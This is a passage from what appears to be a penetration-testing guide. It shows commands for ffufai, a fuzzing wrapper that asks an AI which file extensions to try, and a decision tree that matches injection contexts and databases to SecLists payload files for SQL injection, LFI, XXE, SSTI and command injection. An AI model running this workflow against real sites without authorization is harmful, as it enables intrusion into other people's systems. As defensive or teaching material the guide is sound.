ffufai -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt

# ffufai inspects the server headers and URL, then asks the AI:
# "Given this is a PHP/Apache server, which extensions should I fuzz?"
# AI responds: php, php3, php4, php5, phtml, inc, bak, swp, ...
# ffufai appends extension suggestions to each wordlist entry automatically

# All ffuf flags work transparently:
ffufai -u https://target.com/FUZZ -w wordlist.txt -fc 404 -mc all -t 50

# Manual extension override (skip AI suggestions):
ffufai -u https://target.com/FUZZ -w wordlist.txt -e .php,.bak,.txt,.html
```

## Workflow: Choosing the Right Payload List

```
# Decision tree for payload selection:
#
# 1. What is the injection context?
#    - URL parameter → start with quick-SQLi.txt + LFI-Jhaddix.txt + XSS-Polyglots
#    - XML body → XXE-Fuzzing.txt
#    - Template engine output → template-engines-expression.txt
#    - Shell/system call → command-injection-commix.txt
#    - Login form → sqli.auth.bypass.txt
#    - 403 response → Fuzzing/403/403.md techniques
#
# 2. What is the stack?
#    - MySQL → MySQL.fuzzdb.txt + MySQL-SQLi-Login-Bypass
#    - MSSQL → MSSQL.fuzzdb.txt
#    - Oracle → Oracle.fuzzdb.txt
#    - MongoDB → NoSQL.txt
#    - PHP → php://filter in LFI, SSTI Twig/Smarty
#    - Java → FreeMarker/Velocity SSTI, XXE OOB
#
# 3. Is it blind?
#    - Time-based → Generic-BlindSQLi.fuzzdb.txt
#    - OOB → use interactsh/Burp Collaborator as callback
#    - Boolean → measure response length difference
```
